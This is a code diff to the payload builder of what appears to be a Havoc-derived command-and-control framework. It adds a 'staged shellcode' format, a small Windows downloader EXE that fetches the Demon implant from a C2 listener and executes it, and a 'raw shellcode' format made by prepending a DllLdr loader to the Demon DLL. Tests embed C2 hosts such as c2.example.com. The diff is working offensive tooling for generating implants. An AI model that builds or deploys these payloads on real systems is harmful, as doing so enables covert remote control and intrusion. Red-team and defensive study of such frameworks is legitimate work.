@@ -203,6 +203,11 @@ struct PayloadBuilderInner {
     source_root: PathBuf,
     shellcode_x64_template: PathBuf,
     shellcode_x86_template: PathBuf,
+    /// Pre-compiled DllLdr position-independent loader (x64 only).
+    /// Prepended to the Demon DLL to produce the Raw Shellcode format.
+    dllldr_x64_template: PathBuf,
+    /// C source template compiled standalone for the Staged Shellcode format.
+    stager_template: PathBuf,
     default_demon: DemonConfig,
     binary_patch: Option<BinaryConfig>,
     cache: PayloadCache,
@@ -273,6 +278,12 @@ enum OutputFormat {
     Dll,
     ReflectiveDll,
     Shellcode,
+    /// Small HTTP(S) downloader EXE that fetches and executes the Demon
+    /// shellcode payload at run time rather than embedding it directly.
+    StagedShellcode,
+    /// Position-independent shellcode produced by prepending `DllLdr.x64.bin`
+    /// to the Demon DLL (x64 only; the DllLdr binary has no x86 counterpart).
+    RawShellcode,
 }
 
 impl Architecture {
@@ -309,6 +320,8 @@ impl OutputFormat {
             "Windows Dll" => Ok(Self::Dll),
             "Windows Reflective Dll" => Ok(Self::ReflectiveDll),
             "Windows Shellcode" => Ok(Self::Shellcode),
+            "Windows Shellcode Staged" => Ok(Self::StagedShellcode),
+            "Windows Raw Shellcode" => Ok(Self::RawShellcode),
             other => Err(PayloadBuildError::InvalidRequest {
                 message: format!("unsupported output format `{other}`"),
             }),
@@ -317,9 +330,9 @@ impl OutputFormat {
 
     const fn file_extension(self) -> &'static str {
         match self {
-            Self::Exe | Self::ServiceExe => ".exe",
+            Self::Exe | Self::ServiceExe | Self::StagedShellcode => ".exe",
             Self::Dll | Self::ReflectiveDll => ".dll",
-            Self::Shellcode => ".bin",
+            Self::Shellcode | Self::RawShellcode => ".bin",
         }
     }
 }
@@ -376,14 +389,19 @@ impl PayloadBuilderService {
         let source_root = repo_root.join("src/Havoc/payloads/Demon");
         let shellcode_x64_template = repo_root.join("src/Havoc/payloads/Shellcode.x64.bin");
         let shellcode_x86_template = repo_root.join("src/Havoc/payloads/Shellcode.x86.bin");
+        let dllldr_x64_template = repo_root.join("src/Havoc/payloads/DllLdr.x64.bin");
+        let stager_template = repo_root.join("payloads/templates/MainStager.c");
 
-        for required_path in [&source_root, &shellcode_x64_template, &shellcode_x86_template] {
+        for required_path in [
+            &source_root,
+            &shellcode_x64_template,
+            &shellcode_x86_template,
+            &dllldr_x64_template,
+            &stager_template,
+        ] {
             if !required_path.exists() {
                 return Err(PayloadBuildError::ToolchainUnavailable {
-                    message: format!(
-                        "required Havoc payload asset missing: {}",
-                        required_path.display()
-                    ),
+                    message: format!("required payload asset missing: {}", required_path.display()),
                 });
             }
         }
@@ -396,6 +414,8 @@ impl PayloadBuilderService {
                 source_root,
                 shellcode_x64_template,
                 shellcode_x86_template,
+                dllldr_x64_template,
+                stager_template,
                 default_demon: profile.demon.clone(),
                 binary_patch: profile.demon.binary.clone(),
                 cache,
@@ -424,6 +444,16 @@ impl PayloadBuilderService {
 
         let architecture = Architecture::parse(&request.arch)?;
         let format = OutputFormat::parse(&request.format)?;
+
+        // The staged shellcode stager does not embed a Demon config — it only
+        // needs the C2 connection parameters from the listener.  Route it to a
+        // separate fast path that bypasses pack_config entirely.
+        if format == OutputFormat::StagedShellcode {
+            return self
+                .build_staged_payload(listener, architecture, &request.format, &mut progress)
+                .await;
+        }
+
         let config = merged_request_config(&request.config, &self.inner.default_demon)?;
 
         // Compute the packed config bytes that will be embedded in the compiled
@@ -486,6 +516,8 @@ impl PayloadBuilderService {
                 source_root: root.join("src/Havoc/payloads/Demon"),
                 shellcode_x64_template: root.join("src/Havoc/payloads/Shellcode.x64.bin"),
                 shellcode_x86_template: root.join("src/Havoc/payloads/Shellcode.x86.bin"),
+                dllldr_x64_template: root.join("src/Havoc/payloads/DllLdr.x64.bin"),
+                stager_template: root.join("payloads/templates/MainStager.c"),
                 default_demon: DemonConfig {
                     sleep: None,
                     jitter: None,
@@ -512,6 +544,8 @@ impl PayloadBuilderService {
         source_root: PathBuf,
         shellcode_x64_template: PathBuf,
         shellcode_x86_template: PathBuf,
+        dllldr_x64_template: PathBuf,
+        stager_template: PathBuf,
         default_demon: DemonConfig,
         binary_patch: Option<BinaryConfig>,
         cache_dir: PathBuf,
@@ -522,6 +556,8 @@ impl PayloadBuilderService {
                 source_root,
                 shellcode_x64_template,
                 shellcode_x86_template,
+                dllldr_x64_template,
+                stager_template,
                 default_demon,
                 binary_patch,
                 cache: PayloadCache::new(cache_dir),
@@ -573,6 +609,50 @@ impl PayloadBuilderService {
             progress(BuildProgress {
                 level: "Info".to_owned(),
                 message: format!("shellcode payload [{} bytes]", shellcode.len()),
+            });
+            progress(BuildProgress {
+                level: "Good".to_owned(),
+                message: "payload generated".to_owned(),
+            });
+            return Ok(shellcode);
+        }
+
+        if format == OutputFormat::RawShellcode {
+            if architecture == Architecture::X86 {
+                return Err(PayloadBuildError::InvalidRequest {
+                    message:
+                        "Windows Raw Shellcode requires x64 architecture: no x86 DllLdr binary \
+                         is available"
+                            .to_owned(),
+                });
+            }
+            progress(BuildProgress {
+                level: "Info".to_owned(),
+                message: "compiling core dll for raw shellcode".to_owned(),
+            });
+            let dll_bytes = self
+                .compile_portable_executable(
+                    listener,
+                    architecture,
+                    OutputFormat::Dll,
+                    config,
+                    compile_dir,
+                    true,
+                    progress,
+                )
+                .await?;
+            let template = tokio::fs::read(&self.inner.dllldr_x64_template).await?;
+
+            progress(BuildProgress {
+                level: "Info".to_owned(),
+                message: format!("compiled core dll [{} bytes]", dll_bytes.len()),
+            });
+
+            let mut shellcode = template;
+            shellcode.extend_from_slice(&dll_bytes);
+            progress(BuildProgress {
+                level: "Info".to_owned(),
+                message: format!("raw shellcode payload [{} bytes]", shellcode.len()),
             });
             progress(BuildProgress {
                 level: "Good".to_owned(),
@@ -712,6 +792,117 @@ impl PayloadBuilderService {
         }
 
         Ok(objects)
+    }
+
+    /// Build path for the staged shellcode format.
+    ///
+    /// The stager does not embed a Demon config — it only needs the C2
+    /// connection parameters.  The cache key is derived from the listener
+    /// connection info so that re-builds with the same listener are cached.
+    async fn build_staged_payload<F>(
+        &self,
+        listener: &ListenerConfig,
+        architecture: Architecture,
+        format_str: &str,
+        progress: &mut F,
+    ) -> Result<PayloadArtifact, PayloadBuildError>
+    where
+        F: FnMut(BuildProgress),
+    {
+        let stager_key_bytes = stager_cache_bytes(listener)?;
+        let cache_key =
+            compute_cache_key(architecture, OutputFormat::StagedShellcode, &stager_key_bytes, None);
+
+        if let Some(cached) = self.inner.cache.get(&cache_key).await {
+            progress(BuildProgress {
+                level: "Info".to_owned(),
+                message: "cache hit — returning cached artifact".to_owned(),
+            });
+            let file_name = format!(
+                "demon{}{}",
+                architecture.suffix(),
+                OutputFormat::StagedShellcode.file_extension()
+            );
+            return Ok(PayloadArtifact { bytes: cached, file_name, format: format_str.to_owned() });
+        }
+
+        progress(BuildProgress {
+            level: "Info".to_owned(),
+            message: "starting stager build".to_owned(),
+        });
+
+        let temp_dir = TempDir::new()?;
+        let compiled =
+            self.compile_stager(listener, architecture, temp_dir.path(), progress).await?;
+        let file_name = format!(
+            "demon{}{}",
+            architecture.suffix(),
+            OutputFormat::StagedShellcode.file_extension()
+        );
+
+        self.inner.cache.put(&cache_key, &compiled).await;
+
+        Ok(PayloadArtifact { bytes: compiled, file_name, format: format_str.to_owned() })
+    }
+
+    /// Compile the staged shellcode stager from `payloads/templates/MainStager.c`.
+    ///
+    /// The stager is a standalone Windows EXE that downloads the Demon
+    /// shellcode payload from the C2 listener at run time and executes it.
+    /// It is compiled without the Demon source tree.
+    async fn compile_stager<F>(
+        &self,
+        listener: &ListenerConfig,
+        architecture: Architecture,
+        compile_dir: &Path,
+        progress: &mut F,
+    ) -> Result<Vec<u8>, PayloadBuildError>
+    where
+        F: FnMut(BuildProgress),
+    {
+        let template_dst = compile_dir.join("MainStager.c");
+        tokio::fs::copy(&self.inner.stager_template, &template_dst).await?;
+
+        let defines = build_stager_defines(listener)?;
+
+        let output_path = compile_dir.join(format!(
+            "stager{}{}",
+            architecture.suffix(),
+            OutputFormat::StagedShellcode.file_extension()
+        ));
+
+        let compiler = match architecture {
+            Architecture::X64 => &self.inner.toolchain.compiler_x64,
+            Architecture::X86 => &self.inner.toolchain.compiler_x86,
+        };
+
+        let entry = if architecture == Architecture::X64 { "WinMain" } else { "_WinMain" };
+
+        let mut args: Vec<OsString> = vec![
+            OsString::from("MainStager.c"),
+            OsString::from("-Os"),
+            OsString::from("-s"),
+            OsString::from("-mwindows"),
+            OsString::from("-lwininet"),
+            OsString::from("-Wl,--gc-sections"),
+        ];
+        args.extend(defines.into_iter().map(|d| OsString::from(format!("-D{d}"))));
+        args.push(OsString::from("-e"));
+        args.push(OsString::from(entry));
+        args.push(OsString::from("-o"));
+        args.push(output_path.as_os_str().to_os_string());
+
+        progress(BuildProgress {
+            level: "Info".to_owned(),
+            message: "compiling stager".to_owned(),
+        });
+        run_command(compiler, &args, compile_dir, progress).await?;
+        progress(BuildProgress {
+            level: "Good".to_owned(),
+            message: "payload generated".to_owned(),
+        });
+
+        Ok(tokio::fs::read(&output_path).await?)
     }
 }
 
@@ -1143,6 +1334,74 @@ fn format_config_bytes(bytes: &[u8]) -> String {
     bytes.iter().map(|byte| format!("0x{byte:02x}")).collect::<Vec<_>>().join("\\,")
 }
 
+/// Build the `-D` defines injected into the staged shellcode stager template.
+///
+/// Only HTTP listeners are supported: the stager makes an outbound HTTP(S) GET
+/// request, which has no equivalent for SMB or DNS listeners.
+fn build_stager_defines(listener: &ListenerConfig) -> Result<Vec<String>, PayloadBuildError> {
+    let http = match listener {
+        ListenerConfig::Http(http) => http,
+        _ => {
+            return Err(PayloadBuildError::InvalidRequest {
+                message: "Windows Shellcode Staged requires an HTTP listener".to_owned(),
+            });
+        }
+    };
+
+    let host = http.hosts.first().ok_or_else(|| PayloadBuildError::InvalidRequest {
+        message: "HTTP listener has no configured hosts".to_owned(),
+    })?;
+    let port = http.port_conn.unwrap_or(http.port_bind);
+    let uri = http.uris.first().map(String::as_str).unwrap_or("/");
+
+    // Embed host and URI as C byte-array initialisers so that no shell quoting
+    // is needed and the values survive the -D argument intact.
+    let host_bytes_with_nul: Vec<u8> = host.bytes().chain(std::iter::once(0u8)).collect();
+    let uri_bytes_with_nul: Vec<u8> = uri.bytes().chain(std::iter::once(0u8)).collect();
+
+    let host_define = format!("STAGER_HOST={{{}}}", format_config_bytes(&host_bytes_with_nul));
+    let uri_define = format!("STAGER_URI={{{}}}", format_config_bytes(&uri_bytes_with_nul));
+    let port_define = format!("STAGER_PORT={port}");
+    let secure_define = format!("STAGER_SECURE={}", u8::from(http.secure));
+
+    for define in [&host_define, &uri_define, &port_define, &secure_define] {
+        validate_define(define)?;
+    }
+
+    Ok(vec![host_define, uri_define, port_define, secure_define])
+}
+
+/// Serialise the listener connection parameters into a byte string used as the
+/// staged shellcode cache key.
+///
+/// Only the fields that determine the compiled stager binary are included:
+/// host, port, URI, and the HTTPS flag.
+fn stager_cache_bytes(listener: &ListenerConfig) -> Result<Vec<u8>, PayloadBuildError> {
+    let http = match listener {
+        ListenerConfig::Http(http) => http,
+        _ => {
+            return Err(PayloadBuildError::InvalidRequest {
+                message: "Windows Shellcode Staged requires an HTTP listener".to_owned(),
+            });
+        }
+    };
+
+    let host = http.hosts.first().ok_or_else(|| PayloadBuildError::InvalidRequest {
+        message: "HTTP listener has no configured hosts".to_owned(),
+    })?;
+    let port = http.port_conn.unwrap_or(http.port_bind);
+    let uri = http.uris.first().map(String::as_str).unwrap_or("/");
+
+    let mut out = Vec::new();
+    out.extend_from_slice(host.as_bytes());
+    out.push(0);
+    out.extend_from_slice(&port.to_le_bytes());
+    out.extend_from_slice(uri.as_bytes());
+    out.push(0);
+    out.push(u8::from(http.secure));
+    Ok(out)
+}
+
 fn default_compiler_flags(format: OutputFormat) -> Vec<&'static str> {
     let mut flags = vec![
         "-Os",
@@ -1197,7 +1456,12 @@ fn main_args(architecture: Architecture, format: OutputFormat) -> Vec<&'static s
             if architecture == Architecture::X64 { "DllMain" } else { "_DllMain" },
             "src/main/MainDll.c",
         ],
-        OutputFormat::Shellcode => Vec::new(),
+        // These formats never reach compile_portable_executable:
+        // Shellcode and RawShellcode compile a DLL then prepend a loader binary,
+        // StagedShellcode is compiled by compile_stager via its own code path.
+        OutputFormat::Shellcode | OutputFormat::RawShellcode | OutputFormat::StagedShellcode => {
+            Vec::new()
+        }
     }
 }
 
@@ -1707,6 +1971,14 @@ mod tests {
             service.inner.shellcode_x86_template,
             temp.path().join("src/Havoc/payloads/Shellcode.x86.bin")
         );
+        assert_eq!(
+            service.inner.dllldr_x64_template,
+            temp.path().join("src/Havoc/payloads/DllLdr.x64.bin")
+        );
+        assert_eq!(
+            service.inner.stager_template,
+            temp.path().join("payloads/templates/MainStager.c")
+        );
         assert_eq!(service.inner.default_demon, profile.demon);
         Ok(())
     }
@@ -1748,7 +2020,7 @@ mod tests {
         assert!(matches!(
             error,
             PayloadBuildError::ToolchainUnavailable { message }
-                if message.contains("required Havoc payload asset missing")
+                if message.contains("required payload asset missing")
                     && message.contains("Shellcode.x86.bin")
         ));
         Ok(())
@@ -2523,6 +2795,10 @@ mod tests {
         std::fs::create_dir_all(payload_root.join("Demon"))?;
         std::fs::write(payload_root.join("Shellcode.x64.bin"), [0x90, 0x90])?;
         std::fs::write(payload_root.join("Shellcode.x86.bin"), [0x90, 0x90])?;
+        std::fs::write(payload_root.join("DllLdr.x64.bin"), [0x55, 0x48])?;
+        let templates_dir = repo_root.join("payloads/templates");
+        std::fs::create_dir_all(&templates_dir)?;
+        std::fs::write(templates_dir.join("MainStager.c"), "int main(void){return 0;}")?;
         Ok(())
     }
 
@@ -2755,6 +3031,10 @@ mod tests {
         std::fs::write(source_root.join("src/Demon.c"), "int demo = 1;")?;
         std::fs::write(shellcode_root.join("Shellcode.x64.bin"), [0x90, 0x90])?;
         std::fs::write(shellcode_root.join("Shellcode.x86.bin"), [0x90, 0x90])?;
+        std::fs::write(shellcode_root.join("DllLdr.x64.bin"), [0x55, 0x48])?;
+        let templates_dir = temp.path().join("payloads/templates");
+        std::fs::create_dir_all(&templates_dir)?;
+        std::fs::write(templates_dir.join("MainStager.c"), "int main(void){return 0;}")?;
 
         let nasm = bin_dir.join("nasm");
         let gcc = bin_dir.join("x86_64-w64-mingw32-gcc");
@@ -2787,6 +3067,8 @@ mod tests {
             source_root,
             shellcode_root.join("Shellcode.x64.bin"),
             shellcode_root.join("Shellcode.x86.bin"),
+            shellcode_root.join("DllLdr.x64.bin"),
+            templates_dir.join("MainStager.c"),
             DemonConfig {
                 sleep: None,
                 jitter: None,
@@ -2871,6 +3153,10 @@ mod tests {
         std::fs::write(source_root.join("src/Demon.c"), "int demo = 1;")?;
         std::fs::write(shellcode_root.join("Shellcode.x64.bin"), [0x90, 0x90])?;
         std::fs::write(shellcode_root.join("Shellcode.x86.bin"), [0x90, 0x90])?;
+        std::fs::write(shellcode_root.join("DllLdr.x64.bin"), [0x55, 0x48])?;
+        let templates_dir = temp.path().join("payloads/templates");
+        std::fs::create_dir_all(&templates_dir)?;
+        std::fs::write(templates_dir.join("MainStager.c"), "int main(void){return 0;}")?;
 
         let nasm = bin_dir.join("nasm");
         let gcc_x64 = bin_dir.join("x86_64-w64-mingw32-gcc");
@@ -2918,6 +3204,8 @@ mod tests {
             source_root,
             shellcode_root.join("Shellcode.x64.bin"),
             shellcode_root.join("Shellcode.x86.bin"),
+            shellcode_root.join("DllLdr.x64.bin"),
+            templates_dir.join("MainStager.c"),
             DemonConfig {
                 sleep: None,
                 jitter: None,
@@ -3172,6 +3460,10 @@ mod tests {
         std::fs::write(source_root.join("src/Demon.c"), "int demo = 1;")?;
         std::fs::write(shellcode_root.join("Shellcode.x64.bin"), [0x90_u8, 0x90])?;
         std::fs::write(shellcode_root.join("Shellcode.x86.bin"), [0x90_u8, 0x90])?;
+        std::fs::write(shellcode_root.join("DllLdr.x64.bin"), [0x55_u8, 0x48])?;
+        let templates_dir = temp.path().join("payloads/templates");
+        std::fs::create_dir_all(&templates_dir)?;
+        std::fs::write(templates_dir.join("MainStager.c"), "int main(void){return 0;}")?;
 
         let nasm = bin_dir.join("nasm");
         let gcc = bin_dir.join("x86_64-w64-mingw32-gcc");
@@ -3198,6 +3490,8 @@ mod tests {
             source_root,
             shellcode_root.join("Shellcode.x64.bin"),
             shellcode_root.join("Shellcode.x86.bin"),
+            shellcode_root.join("DllLdr.x64.bin"),
+            templates_dir.join("MainStager.c"),
             DemonConfig {
                 sleep: None,
                 jitter: None,
@@ -3406,5 +3700,337 @@ mod tests {
         let key_bin = compute_cache_key(Architecture::X64, OutputFormat::Shellcode, b"c", None);
         assert_eq!(key_exe.ext, ".exe");
         assert_eq!(key_bin.ext, ".bin");
+    }
+
+    // ──────────────────────────────────────────────────────────────────────
+    // OutputFormat: new variants
+    // ──────────────────────────────────────────────────────────────────────
+
+    #[test]
+    fn output_format_parses_staged_shellcode() {
+        let fmt = OutputFormat::parse("Windows Shellcode Staged")
+            .expect("should parse Windows Shellcode Staged");
+        assert_eq!(fmt, OutputFormat::StagedShellcode);
+        assert_eq!(fmt.file_extension(), ".exe");
+    }
+
+    #[test]
+    fn output_format_parses_raw_shellcode() {
+        let fmt = OutputFormat::parse("Windows Raw Shellcode")
+            .expect("should parse Windows Raw Shellcode");
+        assert_eq!(fmt, OutputFormat::RawShellcode);
+        assert_eq!(fmt.file_extension(), ".bin");
+    }
+
+    #[test]
+    fn output_format_parse_rejects_unknown_format() {
+        let err = OutputFormat::parse("Windows Invalid Format")
+            .expect_err("unknown format should be rejected");
+        assert!(
+            matches!(&err, PayloadBuildError::InvalidRequest { message }
+                if message.contains("Windows Invalid Format")),
+            "unexpected error: {err}"
+        );
+    }
+
+    // ──────────────────────────────────────────────────────────────────────
+    // build_stager_defines
+    // ──────────────────────────────────────────────────────────────────────
+
+    #[test]
+    fn build_stager_defines_embeds_host_port_uri_and_secure_flag()
+    -> Result<(), Box<dyn std::error::Error>> {
+        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
+            name: "http".to_owned(),
+            kill_date: None,
+            working_hours: None,
+            hosts: vec!["c2.example.com".to_owned()],
+            host_bind: "0.0.0.0".to_owned(),
+            host_rotation: "round-robin".to_owned(),
+            port_bind: 80,
+            port_conn: Some(443),
+            method: None,
+            behind_redirector: false,
+            trusted_proxy_peers: Vec::new(),
+            user_agent: None,
+            headers: Vec::new(),
+            uris: vec!["/stage1".to_owned()],
+            host_header: None,
+            secure: true,
+            cert: None,
+            response: None,
+            proxy: None,
+        }));
+
+        let defines = build_stager_defines(&listener)?;
+
+        // Every define must pass the injection-safety validator.
+        for d in &defines {
+            validate_define(d)?;
+        }
+        // STAGER_PORT uses port_conn (443) not port_bind (80).
+        assert!(defines.iter().any(|d| d == "STAGER_PORT=443"), "port define missing: {defines:?}");
+        // STAGER_SECURE=1 because secure=true.
+        assert!(defines.iter().any(|d| d == "STAGER_SECURE=1"), "secure flag missing: {defines:?}");
+        // Host bytes for "c2.example.com" must appear in the STAGER_HOST define.
+        let host_define = defines
+            .iter()
+            .find(|d| d.starts_with("STAGER_HOST="))
+            .expect("STAGER_HOST define missing");
+        // "c2" starts with 0x63, 0x32 — spot-check first two bytes.
+        assert!(host_define.contains("0x63"), "host bytes missing '0x63' (c): {host_define}");
+        assert!(host_define.contains("0x32"), "host bytes missing '0x32' (2): {host_define}");
+        Ok(())
+    }
+
+    #[test]
+    fn build_stager_defines_uses_port_bind_when_port_conn_is_none()
+    -> Result<(), Box<dyn std::error::Error>> {
+        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
+            name: "http".to_owned(),
+            kill_date: None,
+            working_hours: None,
+            hosts: vec!["host.local".to_owned()],
+            host_bind: "0.0.0.0".to_owned(),
+            host_rotation: "round-robin".to_owned(),
+            port_bind: 8080,
+            port_conn: None,
+            method: None,
+            behind_redirector: false,
+            trusted_proxy_peers: Vec::new(),
+            user_agent: None,
+            headers: Vec::new(),
+            uris: Vec::new(),
+            host_header: None,
+            secure: false,
+            cert: None,
+            response: None,
+            proxy: None,
+        }));
+
+        let defines = build_stager_defines(&listener)?;
+        assert!(defines.iter().any(|d| d == "STAGER_PORT=8080"), "should fall back to port_bind");
+        Ok(())
+    }
+
+    #[test]
+    fn build_stager_defines_uses_default_uri_when_uris_empty()
+    -> Result<(), Box<dyn std::error::Error>> {
+        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
+            name: "http".to_owned(),
+            kill_date: None,
+            working_hours: None,
+            hosts: vec!["host.local".to_owned()],
+            host_bind: "0.0.0.0".to_owned(),
+            host_rotation: "round-robin".to_owned(),
+            port_bind: 80,
+            port_conn: None,
+            method: None,
+            behind_redirector: false,
+            trusted_proxy_peers: Vec::new(),
+            user_agent: None,
+            headers: Vec::new(),
+            uris: Vec::new(), // empty — should default to "/"
+            host_header: None,
+            secure: false,
+            cert: None,
+            response: None,
+            proxy: None,
+        }));
+
+        let defines = build_stager_defines(&listener)?;
+        // "/" is 0x2f.
+        let uri_define = defines
+            .iter()
+            .find(|d| d.starts_with("STAGER_URI="))
+            .expect("STAGER_URI define missing");
+        assert!(uri_define.contains("0x2f"), "default '/' URI bytes missing: {uri_define}");
+        Ok(())
+    }
+
+    #[test]
+    fn build_stager_defines_rejects_non_http_listener() {
+        let listener = ListenerConfig::Smb(red_cell_common::SmbListenerConfig {
+            name: "smb".to_owned(),
+            pipe_name: "pivot".to_owned(),
+            kill_date: None,
+            working_hours: None,
+        });
+        let err = build_stager_defines(&listener)
+            .expect_err("non-HTTP listener should be rejected for stager");
+        assert!(
+            matches!(&err, PayloadBuildError::InvalidRequest { message }
+                if message.contains("HTTP listener")),
+            "unexpected error: {err}"
+        );
+    }
+
+    // ──────────────────────────────────────────────────────────────────────
+    // build_payload: new formats (integration with fake toolchain)
+    // ──────────────────────────────────────────────────────────────────────
+
+    #[tokio::test]
+    async fn build_payload_raw_shellcode_rejects_x86() -> Result<(), Box<dyn std::error::Error>> {
+        let service = PayloadBuilderService::disabled_for_tests();
+        let request = BuildPayloadRequestInfo {
+            agent_type: "Demon".to_owned(),
+            listener: "http".to_owned(),
+            arch: "x86".to_owned(),
+            format: "Windows Raw Shellcode".to_owned(),
+            config: r#"{"Sleep":"5","Jitter":"0","Sleep Technique":"WaitForSingleObjectEx","Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"a","Spawn32":"b"}}"#.to_owned(),
+        };
+        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
+            name: "http".to_owned(),
+            kill_date: None,
+            working_hours: None,
+            hosts: vec!["listener.local".to_owned()],
+            host_bind: "0.0.0.0".to_owned(),
+            host_rotation: "round-robin".to_owned(),
+            port_bind: 443,
+            port_conn: Some(443),
+            method: None,
+            behind_redirector: false,
+            trusted_proxy_peers: Vec::new(),
+            user_agent: None,
+            headers: Vec::new(),
+            uris: Vec::new(),
+            host_header: None,
+            secure: false,
+            cert: None,
+            response: None,
+            proxy: None,
+        }));
+
+        let err = service
+            .build_payload(&listener, &request, |_| {})
+            .await
+            .expect_err("x86 raw shellcode must be rejected");
+        assert!(
+            matches!(&err, PayloadBuildError::InvalidRequest { message }
+                if message.contains("x64")),
+            "unexpected error: {err}"
+        );
+        Ok(())
+    }
+
+    #[tokio::test]
+    async fn build_payload_staged_shellcode_rejects_non_http()
+    -> Result<(), Box<dyn std::error::Error>> {
+        let service = PayloadBuilderService::disabled_for_tests();
+        let request = BuildPayloadRequestInfo {
+            agent_type: "Demon".to_owned(),
+            listener: "smb".to_owned(),
+            arch: "x64".to_owned(),
+            format: "Windows Shellcode Staged".to_owned(),
+            config: "{}".to_owned(),
+        };
+        let listener = ListenerConfig::Smb(red_cell_common::SmbListenerConfig {
+            name: "smb".to_owned(),
+            pipe_name: "pivot".to_owned(),
+            kill_date: None,
+            working_hours: None,
+        });
+
+        let err = service
+            .build_payload(&listener, &request, |_| {})
+            .await
+            .expect_err("staged shellcode with SMB listener must be rejected");
+        assert!(
+            matches!(&err, PayloadBuildError::InvalidRequest { message }
+                if message.contains("HTTP listener")),
+            "unexpected error: {err}"
+        );
+        Ok(())
+    }
+
+    #[tokio::test]
+    async fn build_payload_staged_shellcode_uses_stager_template()
+    -> Result<(), Box<dyn std::error::Error>> {
+        let temp = TempDir::new()?;
+        let nasm_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\n";
+        let gcc_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'stager' > \"$1\"; break; fi; shift; done\necho gcc-stager-ok\n";
+        let (service, listener, _) = setup_build_fixture(&temp, nasm_ok, gcc_ok)?;
+
+        let request = BuildPayloadRequestInfo {
+            agent_type: "Demon".to_owned(),
+            listener: "http".to_owned(),
+            arch: "x64".to_owned(),
+            format: "Windows Shellcode Staged".to_owned(),
+            config: "{}".to_owned(),
+        };
+
+        let mut messages = Vec::new();
+        let artifact = service
+            .build_payload(&listener, &request, |m| messages.push(m.message.clone()))
+            .await?;
+
+        assert_eq!(artifact.bytes, b"stager");
+        assert_eq!(artifact.file_name, "demon.x64.exe");
+        assert_eq!(artifact.format, "Windows Shellcode Staged");
+        assert!(
+            messages.iter().any(|m| m.contains("gcc-stager-ok")),
+            "expected gcc output in messages: {messages:?}"
+        );
+        Ok(())
+    }
+
+    #[tokio::test]
+    async fn build_payload_raw_shellcode_prepends_dllldr_template()
+    -> Result<(), Box<dyn std::error::Error>> {
+        let temp = TempDir::new()?;
+        let nasm_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\n";
+        // Compiler writes exactly "dll" as the output DLL bytes.
+        let gcc_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'dll' > \"$1\"; break; fi; shift; done\necho gcc-raw-ok\n";
+        let (service, listener, _) = setup_build_fixture(&temp, nasm_ok, gcc_ok)?;
+
+        let request = BuildPayloadRequestInfo {
+            agent_type: "Demon".to_owned(),
+            listener: "http".to_owned(),
+            arch: "x64".to_owned(),
+            format: "Windows Raw Shellcode".to_owned(),
+            config: r#"{"Sleep":"5","Jitter":"0","Sleep Technique":"WaitForSingleObjectEx","Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"a","Spawn32":"b"}}"#.to_owned(),
+        };
+
+        let artifact = service.build_payload(&listener, &request, |_| {}).await?;
+
+        // DllLdr.x64.bin stub is [0x55, 0x48]; the fake gcc writes "dll".
+        assert_eq!(&artifact.bytes[..2], &[0x55, 0x48], "DllLdr header not prepended");
+        assert_eq!(&artifact.bytes[2..], b"dll", "DLL bytes not appended after DllLdr header");
+        assert_eq!(artifact.file_name, "demon.x64.bin");
+        assert_eq!(artifact.format, "Windows Raw Shellcode");
+        Ok(())
+    }
+
+    #[tokio::test]
+    async fn build_payload_staged_shellcode_cache_hit_skips_compilation()
+    -> Result<(), Box<dyn std::error::Error>> {
+        let temp = TempDir::new()?;
+        let nasm_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\n";
+        let gcc_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'stager' > \"$1\"; break; fi; shift; done\n";
+        let (service, listener, _) = setup_build_fixture(&temp, nasm_ok, gcc_ok)?;
+
+        let request = BuildPayloadRequestInfo {
+            agent_type: "Demon".to_owned(),
+            listener: "http".to_owned(),
+            arch: "x64".to_owned(),
+            format: "Windows Shellcode Staged".to_owned(),
+            config: "{}".to_owned(),
+        };
+
+        // First build — compiles and caches.
+        let first = service.build_payload(&listener, &request, |_| {}).await?;
+
+        // Second build — must return cache hit.
+        let mut messages = Vec::new();
+        let second = service
+            .build_payload(&listener, &request, |m| messages.push(m.message.clone()))
+            .await?;
+
+        assert_eq!(first.bytes, second.bytes, "cached bytes must match compiled bytes");
+        assert!(
+            messages.iter().any(|m| m.contains("cache hit")),
+            "second request should be a cache hit: {messages:?}"
+        );
+        Ok(())
     }
 }
